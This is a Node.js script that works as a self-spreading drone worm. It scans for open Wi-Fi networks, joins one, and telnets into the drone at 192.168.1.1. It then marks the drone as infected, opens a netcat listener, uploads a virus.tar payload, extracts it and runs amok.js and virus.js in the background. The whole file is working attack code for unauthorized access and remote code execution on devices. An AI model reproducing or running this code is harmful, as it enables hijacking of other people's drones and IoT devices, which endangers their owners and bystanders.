var iw = require('./lib/iw')(process.argv[2] || 'ath0');
var net = require('net');
var fs = require('fs');
var spawn = require('child_process').spawn;
var exec = require('child_process').exec;

var canScan = process.argv[3] === 'scan';

function attack () {
    if (canScan) {
        iw.scan(function (err, nodes) {
            if (err) return console.error(err)
            fs.writeFileSync(__dirname + '/nodes.json', JSON.stringify(nodes));
            withNodes(nodes);
        });
    }
    else {
        withNodes(require('./nodes.json'));
    }
    
    function withNodes (nodes) {
        var open = nodes.filter(function (node) {
            return node.encrypted === false;
        });
        //*
        open = [
            {
                'essid' : 'WindowsAzureDrone5',
                'address' : '90:03:B7:2A:EA:6C'
            }
        ];
        //*/
        var ap = open[Math.floor(Math.random() * open.length)];
        console.log('==================================================');
        console.log(ap);
        console.log('==================================================');
        if (!ap) return setTimeout(attack, 5000);
        
        iw.connect(ap.essid, function (err) {
            if (err) setTimeout(attack, 5000);
            else dhcp(function (err) {
                if (err) setTimeout(attack, 5000)
                else setTimeout(function () {
                    telnet('192.168.1.1');
                }, 2000)
            })
        });
    }
}

function dhcp (cb) {
    var failed = false;
    
    var to1;
    var to0 = setTimeout(function () {
        failed = true;
        if (to1) clearTimeout(to1);
        cb('timed out');
    }, 15 * 1000);
    
    function retry () {
        if (failed) return;
        
        var ps = spawn('dhclient', [ iw.iface ]);
        ps.on('exit', check);
    }
    
    function check () {
        getAddr(function (addr) {
            if (/^192\.168\./.test(addr)) {
                clearTimeout(to0);
                clearTimeout(to1);
                cb(null);
            }
            else to1 = setTimeout(retry, 5000);
        });
    }
    retry();
}

function getAddr (cb) {
    exec('ifconfig ' + iw.iface, function (err, stdout) {
        var m = /inet addr:(\S+)/.exec(stdout);
        cb(m && m[1]);
    });
}

function telnet (addr) {
    console.log('> telnet ' + addr);
    var s = net.connect(23, addr);
    s.pipe(process.stdout, { end : false });
    process.stdin.pipe(s);
    process.stdin.resume();
    
    var pending = 1;
    s.on('data', function ondata (buf) {
        if (/THIS DRONE IS INFECTED/.test(buf)) {
            console.log('already infected');
            //s.destroy();
        }
        
        String(buf).split('\n').forEach(function (line) {
            if (/\+ Done/.test(line)) {
                pending --;
                if (pending === 0) setTimeout(done, 2000);
            }
        });
        
        function done () {
            s.removeListener('data', ondata);
            s.write('tar xf virus.tar\n');
            
            setTimeout(function () {
                s.write('../node amok.js &\n');
            }, 5 * 1000);
            
            setTimeout(function () {
                s.write('../node virus.js &\n');
            }, 10 * 1000);
        }
    });
    
    s.on('connect', function () {
        s.write('cat /tmp/INFECTED\n');
        s.write('echo THIS DRONE ``IS INFECTED > /tmp/INFECTED\n');
        
        s.write('mkdir -p /data/video/virus\n');
        s.write('cd /data/video/virus\n');
        
        var port = 1000 + Math.floor(64536 * Math.random());
        s.write('nc -lp ' + port + ' > virus.tar &\n');
        setTimeout(function () {
            fs.createReadStream(__dirname + '/virus.tar')
                .pipe(net.connect(port, addr))
            ;
        }, 3000);
    });
    return s;
}

attack();
